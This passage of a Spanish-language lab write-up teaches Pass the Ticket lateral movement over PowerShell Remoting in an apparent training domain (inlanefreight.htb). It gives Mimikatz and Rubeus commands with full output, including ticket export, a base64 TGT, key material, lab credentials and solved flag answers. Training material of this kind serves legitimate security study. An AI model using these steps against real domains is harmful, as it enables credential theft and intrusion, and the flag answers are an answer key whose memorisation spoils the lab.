**Nota**: En lugar de abrir `mimikatz.exe` con `cmd.exe` y salir para obtener el ticket en el símbolo del sistema actual, podemos usar el módulo Mimikatz `misc`para iniciar una nueva ventana del símbolo del sistema con el ticket importado usando el comando `misc::cmd`
{% endhint %}

***

### Pass the Ticket con PowerShell Remoto (Windows)

[PowerShell Remoto](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.2) nos permite ejecutar scripts o comandos en un ordenador remoto. Los administradores suelen utilizar PowerShell Remoto para administrar computadoras remotas en la red. Habilitar PowerShell Remoto crea escuchas HTTP y HTTPS. El escucha se ejecuta en el puerto estándar TCP/5985 para HTTP y TCP/5986 para HTTPS.

Para crear una sesión de PowerShell Remoto en una computadora remota, debe tener permisos administrativos, ser miembro del grupo Usuarios de administración remota o tener permisos explícitos de PowerShell Remoto en la configuración de su sesión.

Supongamos que encontramos una cuenta de usuario que no tiene privilegios administrativos en una computadora remota pero que es miembro del grupo Usuarios de administración remota. En ese caso, podemos usar PowerShell Remoto para conectarnos a esa computadora y ejecutar comandos.

***

### <mark style="color:purple;">Mimikatz - PowerShell Remoto con Pass the Ticket</mark>

Para usar PowerShell Remoto con Pass the Ticket, podemos usar Mimikatz para importar nuestro ticket y luego abrir una consola PowerShell y conectarnos a la máquina de destino. Abramos uno nuevo `cmd.exe`y ejecutemos `mimikatz.exe`, luego importemos el ticket que recopilamos usando `kerberos::ptt`. Una vez que el ticket se importa a nuestra sesión de cmd.exe, podemos iniciar un símbolo del sistema de PowerShell desde el mismo cmd.exe y usar el comando `Enter-PSSession` para conectarnos a la máquina de destino.

**Mimikatz - Pass the Ticket para movimiento lateral**

```cmd-session
C:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # exit
Bye!

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
[DC01]: PS C:\Users\john\Documents>
```

***

### <mark style="color:purple;">Rubeus - PowerShell Remoto con Pass the Ticket</mark>

Rubeus tiene la opción `createnetonly`, que crea un proceso de sacrificio/sesión de inicio de sesión ( [tipo de inicio de sesión 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/) ). El proceso está oculto de forma predeterminada, pero podemos especificar la bandera `/show`para mostrar el proceso y el resultado es el equivalente a `runas /netonly`. Esto evita el borrado de los TGT existentes para la sesión de inicio de sesión actual.

**Crear un Sacrificial Process con Rubeus**

```powershell
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3


[*] Action: Create process (/netonly)


[*] Using random username and password.

[*] Showing process : True
[*] Username        : JMI8CL7C
[*] Domain          : DTCDV6VL
[*] Password        : MRWI6XGI
[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1556
[+] LUID            : 0xe07648
```

El comando anterior abrirá una nueva ventana de cmd. Desde esa ventana, podemos ejecutar Rubeus para solicitar un nuevo TGT con la opción `/ptt`de importar el ticket a nuestra sesión actual y conectarnos al DC usando PowerShell Remoting.

**Rubeus - Pass the Ticket para movimiento lateral**

```powershell
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\john'
[*] Using domain controller: 10.129.203.120:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      ZWZyZWlnaHQuaHRi
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.htb
  ServiceRealm             :  INLANEFREIGHT.HTB
  UserName                 :  john
  UserRealm                :  INLANEFREIGHT.HTB
  StartTime                :  7/18/2022 5:44:50 AM
  EndTime                  :  7/18/2022 3:44:50 PM
  RenewTill                :  7/25/2022 5:44:50 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  5VdAaevnpxx/f9rXsDDLfK6tH+4qQ3f1GlOB1ClBWh0=
  ASREP (key)              :  9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```

***

## <mark style="color:purple;">Caso práctico</mark>

Vamos a poner en práctica nuestros conocimientos en Pass the Ticket

```
Host:    10.129.81.26
User:    Administrator
Pass:    AnotherC0mpl3xP4$$
```

### <mark style="color:purple;">Pregunta 1</mark>

> Conéctate a la máquina de destino utilizando RDP y las credenciales proporcionados. Exporta todos los tickets presentes en el ordenador. ¿Cuántos usuarios de TGT hay?

```powershell
PS C:\tools> .\mimikatz.exe privilege::debug sekurlsa::tickets /export

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::tickets /export
Authentication Id : 0 ; 624666 (00000000:0009881a)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : MS01
Logon Server      : (null)
Logon Time        : 4/3/2024 5:11:44 AM
SID               : S-1-5-21-430213916-1543111962-1809483319-500

         * Username : MS01$
         * Domain   : inlanefreight.htb
         * Password : f2 16 f1 66 bc 1f 4e 30 6c 4d 15 f7 ac c3 a4 93 0f 1c fb cb 25 7f 93 a4 25 53 b9 b6 3d 02 76 7a 99 46 dd 79 ae d9 40 ef 37 77 98 60 eb d2 24 e6 0f 10 e0 f3 d1 02 11 c4 38 d0 8d d5 d4 ee 13 60 bd 85 99 fb 57 a1 41 cf d9 d3 39 63 68 bd cc 0f 07 2f f0 b0 3c 26 05 d9 76 df 86 72 1a cb 56 67 5f 85 11 e8 1b 9c 15 a7 2b 8e 9a 75 99 fe 92 73 75 71 47 ea c5 b9 5f 71 2f 60 ab 81 54 54 b6 1b 67 49 78 90 71 8b 3b 23 b6 bb f2 c8 40 12 33 44 db ca 0b 88 8e 42 0d 59 1e 0e ae 7b 4d dc 41 20 31 1b a3 0e 40 cd 7d 47 e4 5d ba 8b a4 bc b1 ee 4c c8 11 5a 09 cf 74 94 a6 ca 37 ff 02 0d e7 55 03 eb bf a1 1f 85 b2 f6 3e 8d ca 0b 28 d3 73 5c 04 9d dc a6 74 f5 1e 03 ba 8e 76 77 cc 24 33 cd c2 68 88 ed 47 2c 96 0f 35 fe db a1 a8 2d 94 95

        Group 0 - Ticket Granting Service
        Group 1 - Client Ticket ?
        Group 2 - Ticket Granting Ticket

<SNIP>
mimikatz # exit
Bye!

PS C:\tools> dir *.kirbi

    Directory: C:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/3/2024   5:13 AM           1703 [0;3e4]-0-0-40a50000-MS01$@DNS-dc01.inlanefreight.htb.kirbi
-a----         4/3/2024   5:13 AM           1705 [0;3e4]-0-1-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
-a----         4/3/2024   5:13 AM           1743 [0;3e4]-0-2-40a50000-MS01$@ldap-dc01.inlanefreight.htb.kirbi
-a----         4/3/2024   5:13 AM           1739 [0;3e4]-0-3-40a50000-MS01$@GC-DC01.inlanefreight.htb.kirbi
-a----         4/3/2024   5:13 AM           1633 [0;3e4]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
-a----         4/3/2024   5:13 AM           1633 [0;3e4]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
-a----         4/3/2024   5:13 AM           1743 [0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
-a----         4/3/2024   5:13 AM           1659 [0;3e7]-0-1-40a50000.kirbi
-a----         4/3/2024   5:13 AM           1705 [0;3e7]-0-2-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi
-a----         4/3/2024   5:13 AM           1743 [0;3e7]-0-3-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi
-a----         4/3/2024   5:13 AM           1633 [0;3e7]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
-a----         4/3/2024   5:13 AM           1633 [0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
-a----         4/3/2024   5:13 AM           1641 [0;469bb]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
-a----         4/3/2024   5:13 AM           1623 [0;47379]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
-a----         4/3/2024   5:13 AM           1633 [0;47cb7]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi
```

Esto nos exporta 15 tickets `.kirbi` y encontramos que solamente hay 3 usuarios: julio, john y david

### <mark style="color:purple;">Pregunta 2</mark>

> Utiliza el TGT de John para realizar un ataque Pass the Ticket y recuperar la flag de la carpeta compartida `\DC01.inlanefreight.htb\john`

```powershell
PS C:\tools> .\Rubeus.exe ptt /ticket:"[0;47379]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: Import Ticket
[+] Ticket successfully imported!

PS C:\tools> dir \\DC01.inlanefreight.htb\john

    Directory: \\DC01.inlanefreight.htb\john

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/14/2022   3:54 PM             30 john.txt

PS C:\tools> Get-Content \\DC01.inlanefreight.htb\john\john.txt
Learn1ng_M0r3_Tr1cks_with_J0hn
```

### <mark style="color:purple;">Pregunta 3</mark>

Utilice el TGT de John para realizar un ataque Pass the Ticket y conéctese al DC01 mediante PowerShell Remoting. Lea la flag de C:\john\john.txt

```powershell
PS C:\tools> .\Rubeus.exe ptt /ticket:"[0;47379]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: Import Ticket
[+] Ticket successfully imported!

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> cd /
[DC01]: PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/18/2022   8:19 AM                john
d-----        7/18/2022   8:54 AM                julio
d-----        2/25/2022  10:20 AM                PerfLogs
d-r---        10/6/2021   3:50 PM                Program Files
d-----        7/18/2022  11:00 AM                Program Files (x86)
d-----        10/6/2022   9:46 AM                SharedFolder
d-----        9/22/2022   1:19 PM                tools
d-r---        10/6/2022   6:46 AM                Users
d-----       10/10/2022   5:48 AM                Windows


[DC01]: PS C:\> cd .\john\
[DC01]: PS C:\john> ls


    Directory: C:\john


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/18/2022   8:20 AM             19 john.txt


[DC01]: PS C:\john> type .\john.txt
P4$$_th3_Tick3T_PSR
```
